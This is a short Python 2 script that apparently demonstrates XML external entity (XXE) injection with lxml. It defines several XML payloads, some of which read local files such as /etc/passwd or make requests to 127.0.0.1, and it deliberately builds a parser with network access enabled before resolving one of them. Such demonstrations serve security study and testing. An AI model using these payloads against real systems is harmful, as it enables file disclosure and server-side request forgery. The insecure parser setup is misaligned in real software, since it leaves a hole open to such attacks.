from lxml import etree

#ENTITY
string_xml_internal_val ='''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE entity [
  <!ENTITY copyright "Copyright wiki.wooyun.org">
]>
<wooyun>
  <internal>&copyright;</internal>
</wooyun>
'''

string_xml_external_url='''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/1" > ]>
<wooyun>
  <external>&xxe;</external>
</wooyun>
'''

#ELEMENT ENTITY
string_xml_internal_val1 = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
'''


string_xml_external_url_1='''<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://127.0.0.1/1" >]><foo>&xxe;</foo>
'''


#Binary file (X)
string_xml_external_file='''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE entity [
  <!ENTITY file SYSTEM "file:///usr/bin/whoami">
]>
<wooyun>
  <external>&file;</external>
</wooyun>
'''

xml_parse = etree.XMLParser(no_network=False)
etree.set_default_parser(xml_parse)
dom = etree.fromstring(string_xml_external_url)
node_internal = dom.xpath('//external')
print node_internal[0].text

